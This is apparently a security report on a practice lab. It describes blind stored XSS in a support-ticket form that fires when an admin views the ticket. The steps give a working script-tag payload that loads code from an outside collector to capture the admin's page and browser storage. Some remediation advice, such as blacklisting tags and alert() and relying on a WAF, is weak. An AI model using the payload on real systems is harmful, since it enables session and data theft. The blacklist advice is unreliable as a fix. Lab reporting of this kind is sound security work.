## Title
Blind XSS - SupportHub Customer Support
<!-- Write a short, clear title describing the vulnerability and where it was found. Example: Stored XSS in User Profile -->

## Description
**Affected URL:** https://supporthub.pwnedbox.site/

SupportHub's customer support ticket submission form appears to accept and store HTML/script content in user-controlled fields. A crafted external script payload was submitted through the Name, Subject, and Message fields. After the ticket was submitted, the support request was viewed in the admin panel, where the payload was processed in the admin's browser. An external XSS reporting service received callbacks, indicating that the stored payload was executed in the admin-side context.

## Steps to Reproduce

1. Open the SupportHub support request form: `https://supporthub.pwnedbox.site/submit.php`
2. Enter the following payload into the Name, Subject, and Message fields: `"><script src=https://xss.report/c/priyanshxop></script>`
3. Fill in the required Email field and submit the support request.
4. Confirm that the request is submitted successfully and note the generated ticket ID.
5. Access the SupportHub admin panel and sign in using the lab-provided admin account.
6. Open the submitted support ticket in the admin interface.
7. Check the XSS reporting dashboard for callbacks associated with the payload.
8. Observe callbacks for the SupportHub admin ticket-view page, confirming that the stored payload was triggered when the ticket was viewed.


## POC (Proof of Concept)

Screenshot 1: Support request form with the payload entered into the Name, Subject, and Message fields.

<img width="1918" height="960" alt="image" src="https://github.com/user-attachments/assets/87a9649c-77b7-4f24-a478-dd33a7a58900" />

Screenshot 2: Successful ticket submission and generated ticket ID.

<img width="1918" height="961" alt="image" src="https://github.com/user-attachments/assets/32a23ca8-1ab2-42ab-abbf-bfa4cfca8e8f" />

Screenshot 3: SupportHub admin sign-in page.

<img width="1918" height="965" alt="image" src="https://github.com/user-attachments/assets/cb464ebc-78d3-4fb5-8711-689b624b62fb" />

Screenshot 4: Admin ticket view displaying the submitted request.

<img width="1917" height="970" alt="image" src="https://github.com/user-attachments/assets/e389a0e9-05f6-4446-a704-0156f13114c1" />

Screenshot 5: XSS reporting dashboard showing callbacks from SupportHub admin pages.

<img width="1913" height="968" alt="image" src="https://github.com/user-attachments/assets/29f19abf-6c84-4423-9522-3835a4e88202" />

Screenshot 6: Callback details displaying the captured page DOM and browser storage information.

<img width="1918" height="956" alt="image" src="https://github.com/user-attachments/assets/529985e6-7a15-44ed-ab4b-d262115cba82" />


## Impact
- An attacker may execute JavaScript in an administrator's authenticated browser session.
- Sensitive information accessible to the administrator's page, including session-related or browser storage data, may be exposed if accessible to the injected script.
- The attacker may perform unauthorized actions through the administrator's session, depending on the application's permissions and protections.


## Remediation
- Filter out HTML tags like: `<script>`, `<img>`, `<svg>` from the Report Name field before saving anything to the database
- Filter out JavaScript methods like: `alert()`, `confirm()`, `prompt()` so even if a tag slips through the method won't execute
- If you're using PHP then use `htmlspecialchars()` function before rendering any user input back to the page
- Use Cloudflare as they have so many WAF rules that almost all XSS payloads will be blocked automatically before even reaching the server
